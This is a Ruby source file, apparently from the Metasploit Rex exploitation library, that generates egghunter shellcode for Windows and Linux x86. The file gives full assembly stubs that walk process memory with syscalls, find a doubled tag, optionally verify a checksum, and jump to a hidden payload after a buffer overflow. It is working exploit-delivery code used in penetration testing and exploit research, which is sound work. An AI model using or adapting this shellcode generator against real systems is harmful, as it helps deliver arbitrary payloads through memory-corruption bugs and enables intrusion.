require 'rex/text'
require 'rex/arch'
require 'metasm'

module Rex
module Exploitation

###
#
# This class provides an interface to generating egghunters.  Egghunters are
# used to search process address space for a known byte sequence.  This is
# useful in situations where there is limited room for a payload when an
# overflow occurs, but it's possible to stick a larger payload somewhere else
# in memory that may not be directly predictable.
#
# Original implementation by skape
# (See http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)
#
# Checksum checking implemented by dijital1/corelanc0d3r
# Checksum code merged to Egghunter by jduck
# Conversion to use Metasm by jduck
# Startreg code added by corelanc0d3r
#
###
class Egghunter

	###
	#
	# Windows-based egghunters
	#
	###
	module Windows
		Alias = "win"

		module X86
			Alias = ARCH_X86

			#
			# The egg hunter stub for win/x86.
			#
			def hunter_stub(payload, badchars = '', opts = {})

				startreg = opts[:startreg]

				raise RuntimeError, "Invalid egg string! Need #{esize} bytes." if opts[:eggtag].length != 4
				marker = "0x%x" % opts[:eggtag].unpack('V').first

				checksum = checksum_stub(payload, badchars, opts)

				startstub = ''
				if startreg
					if startreg.downcase != 'edx'
						startstub = "\n\tmov edx,#{startreg}\n\tjmp next_addr"
					else
						startstub = "\n\tjmp next_addr"
					end
				end
				startstub << "\n\t" if startstub.length > 0

				assembly = <<EOS
#{startstub}
check_readable:
	or dx,0xfff
next_addr:
	inc edx
	push edx
	push 0x02   ; use NtAccessCheckAndAuditAlarm syscall
	pop eax
	int 0x2e
	cmp al,5
	pop edx
	je check_readable
check_for_tag:
	; check that the tag matches once
	mov eax,#{marker}
	mov edi,edx
	scasd
	jne next_addr
	; it must match a second time too
	scasd
	jne next_addr

	; check the checksum if the feature is enabled
#{checksum}

	; jump to the payload
	jmp edi
EOS

				assembled_code = Metasm::Shellcode.assemble(Metasm::Ia32.new, assembly).encode_string

				# return the stub
				assembled_code
			end

		end
	end

	###
	#
	# Linux-based egghunters
	#
	###
	module Linux
		Alias = "linux"

		module X86
			Alias = ARCH_X86

			#
			# The egg hunter stub for linux/x86.
			#
			def hunter_stub(payload, badchars = '', opts = {})

				startreg = opts[:startreg]

				raise RuntimeError, "Invalid egg string! Need #{esize} bytes." if opts[:eggtag].length != 4
				marker = "0x%x" % opts[:eggtag].unpack('V').first

				checksum = checksum_stub(payload, badchars, opts)

				startstub = ''
				if startreg
					if startreg.downcase != 'ecx'
						startstub = "\n\tmov ecx,#{startreg}\n\tjmp next_addr"
					else
						startstub = "\n\tjmp next_addr"
					end
				end
				startstub << "\n\t" if startstub.length > 0

				assembly = <<EOS
	cld
#{startstub}
check_readable:
	or cx,0xfff
next_addr:
	inc ecx
	push 0x43   ; use 'sigaction' syscall
	pop eax
	int 0x80
	cmp al,0xf2
	je check_readable

check_for_tag:
	; check that the tag matches once
	mov eax,#{marker}
	mov edi,ecx
	scasd
	jne next_addr
	; it must match a second time too
	scasd
	jne next_addr

	; check the checksum if the feature is enabled
#{checksum}

	; jump to the payload
	jmp edi
EOS

				assembled_code = Metasm::Shellcode.assemble(Metasm::Ia32.new, assembly).encode_string

				# return the stub
				assembled_code
			end

		end
	end

	###
	#
	# Generic interface
	#
	###

	#
	# Creates a new egghunter instance and acquires the sub-class that should
	# be used for generating the stub based on the supplied platform and
	# architecture.
	#
	def initialize(platform, arch = nil)
		Egghunter.constants.each { |c|
			mod = self.class.const_get(c)

			next if ((!mod.kind_of?(::Module)) or
			         (!mod.const_defined?('Alias')))

			if (platform =~ /#{mod.const_get('Alias')}/i)
				self.extend(mod)

				if (arch and mod)
					mod.constants.each { |a|
						amod = mod.const_get(a)

						next if ((!amod.kind_of?(::Module)) or
						         (!amod.const_defined?('Alias')))

						if (arch =~ /#{mod.const_get(a).const_get('Alias')}/i)
							amod = mod.const_get(a)

							self.extend(amod)
						end
					}
				end
			end
		}
	end

	#
	# This method generates an egghunter using the derived hunter stub.
	#
	def generate(payload, badchars = '', opts = {})
		# set defaults if options are missing

		# NOTE: there is no guarantee this won't exist in memory, even when doubled.
		# To address this, use the checksum feature :)
		opts[:eggtag] ||= Rex::Text.rand_text(4, badchars)

		# Generate the hunter_stub portion
		return nil if ((hunter = hunter_stub(payload, badchars, opts)) == nil)

		# Generate the marker bits to be prefixed to the real payload
		egg = ''
		egg << opts[:eggtag] * 2
		egg << payload
		if opts[:checksum]
			cksum = 0
			payload.each_byte { |b|
				cksum += b
			}
			egg << [cksum & 0xff].pack('C')
		end

		return [ hunter, egg ]
	end

protected

	#
	# Stub method that is meant to be overridden.  It returns the raw stub that
	# should be used as the egghunter.
	#
	def hunter_stub(payload, badchars = '', opts = {})
	end

	def checksum_stub(payload, badchars = '', opts = {})
		return '' if not opts[:checksum]

		if payload.length < 0x100
			cmp_reg = "cl"
		elsif payload.length < 0x10000
			cmp_reg = "cx"
		else
			raise RuntimeError, "Payload too big!"
		end
		egg_size = "0x%x" % payload.length

		checksum = <<EOS
	push ecx
	xor ecx,ecx
	xor eax,eax
calc_chksum_loop:
	add al,byte [edi+ecx]
	inc ecx
	cmp #{cmp_reg},#{egg_size}
	jnz calc_chksum_loop
test_chksum:
	cmp al,byte [edi+ecx]
	pop ecx
	jnz next_addr
EOS
	end

end

end
end
